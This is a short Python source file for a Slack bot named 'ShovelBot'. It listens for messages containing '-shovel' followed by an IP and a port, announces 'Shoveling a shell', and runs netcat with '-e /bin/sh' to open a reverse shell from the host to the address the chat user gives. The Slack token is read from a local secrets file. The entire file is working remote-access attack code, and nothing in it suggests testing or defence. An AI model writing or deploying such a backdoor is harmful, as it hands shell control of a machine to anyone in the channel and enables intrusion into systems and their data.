import os
import ssl as ssl_lib
from slack import RTMClient
import time
import subprocess

@RTMClient.run_on(event="message")
def say_hello(**payload):
  data = payload['data']
  web_client = payload['web_client']
  if 'text' in data and '-shovel' in data['text']:
    channel_id = data['channel']
    thread_ts = data['ts']
    user = data['user']
    args = data['text'].split(' ')
    if len(args) == 3:
        ip = args[1]
        port = args[2]

        web_client.chat_postMessage(
            channel=channel_id,
            text=f"Shoveling a shell to <@{user}> to {ip}:{port}!",
            thread_ts=thread_ts,
            username="ShovelBot"
        )
        try:
            subprocess.run(["nc",ip,port,"-e","/bin/sh"])
        except:
            web_client.chat_postMessage(
                channel=channel_id,
                text=f"There was an error processing this request...",
                thread_ts=thread_ts,
                username="ShovelBot"
            )
    else:
        web_client.chat_postMessage(
                channel=channel_id,
                text=f"Invalid syntax. Please include IP and Port respectively, separated by a space.",
                thread_ts=thread_ts,
                username="ShovelBot"
            )

secrets_file = open('secrets.txt','r')
slack_token = secrets_file.readline()
rtm_client = RTMClient(
  token=slack_token,
  connect_method='rtm.start',
  ssl=True
)
rtm_client.start()